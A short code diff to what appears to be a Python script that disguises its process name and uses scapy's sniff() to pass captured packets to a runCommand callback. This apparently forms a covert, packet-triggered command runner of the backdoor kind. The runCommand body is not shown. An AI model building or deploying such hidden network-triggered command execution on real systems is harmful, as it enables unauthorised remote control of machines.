@@ -59,6 +59,6 @@ def setProcessName():
   # libc.prctl(15, byref(procNameBuf), 0, 0, 0)
 
 setProcessName()
-sniff(filter=sniffFilter, prn=)
+sniff(filter=sniffFilter, prn=runCommand)
 # output = subprocess.check_output('ls -l', shell=True)
 # print output
